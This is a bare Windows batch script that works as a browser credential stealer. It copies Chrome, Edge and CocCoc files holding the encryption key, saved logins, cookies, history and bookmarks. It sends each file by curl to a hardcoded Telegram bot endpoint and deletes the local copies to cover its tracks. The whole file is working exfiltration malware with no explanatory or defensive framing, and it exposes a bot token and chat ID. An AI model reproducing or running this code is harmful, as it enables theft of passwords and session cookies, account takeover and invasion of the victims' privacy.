@echo off 

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State" "%USERNAME%_Google_Local State"
curl -F document=@"%USERNAME%_Google_Local State" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_Google_Local State"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%USERNAME%_Google_Login Data"
curl -F document=@"%USERNAME%_Google_Login Data" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_Google_Login Data"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" "%USERNAME%_Google_Bookmarks"
curl -F document=@"%USERNAME%_Google_Bookmarks" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_Google_Bookmarks"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\History" "%USERNAME%_Google_History"
curl -F document=@"%USERNAME%_Google_History" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_Google_History"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" "%USERNAME%_Google_Cookies"
curl -F document=@"%USERNAME%_Google_Cookies" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_Google_Cookies"




echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Local State" "%USERNAME%_Edge_Local State"
curl -F document=@"%USERNAME%_Edge_Local State" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_Edge_Local State"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "%USERNAME%_Edge_Login Data"
curl -F document=@"%USERNAME%_Edge_Login Data" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_Edge_Login Data"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" "%USERNAME%_Edge_Bookmarks"
curl -F document=@"%USERNAME%_Edge_Bookmarks" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_Edge_Bookmarks"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\History" "%USERNAME%_Edge_History"
curl -F document=@"%USERNAME%_Edge_History" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_Edge_History"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies" "%USERNAME%_Edge_Cookies"
curl -F document=@"%USERNAME%_Edge_Cookies" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_Edge_Cookies"





echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\CocCoc\Browser\User Data\Local State" "%USERNAME%_CocCoc_Local State"
curl -F document=@"%USERNAME%_CocCoc_Local State" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_CocCoc_Local State"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\CocCoc\Browser\User Data\Default\Login Data" "%USERNAME%_CocCoc_Login Data"
curl -F document=@"%USERNAME%_CocCoc_Login Data" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_CocCoc_Login Data"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\CocCoc\Browser\User Data\Default\Bookmarks" "%USERNAME%_CocCoc_Bookmarks"
curl -F document=@"%USERNAME%_CocCoc_Bookmarks" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_CocCoc_Bookmarks"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\CocCoc\Browser\User Data\Default\History" "%USERNAME%_CocCoc_History"
curl -F document=@"%USERNAME%_CocCoc_History" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_CocCoc_History"

echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\CocCoc\Browser\User Data\Default\Network\Cookies" "%USERNAME%_CocCoc_Cookies"
curl -F document=@"%USERNAME%_CocCoc_Cookies" "https://api.telegram.org/bot5015466526:AAG7SVgzllf0uqnSvsG1Rb2LuLxYpM3wzlY/sendDocument?chat_id=5093482699"
del /F "%USERNAME%_CocCoc_Cookies"


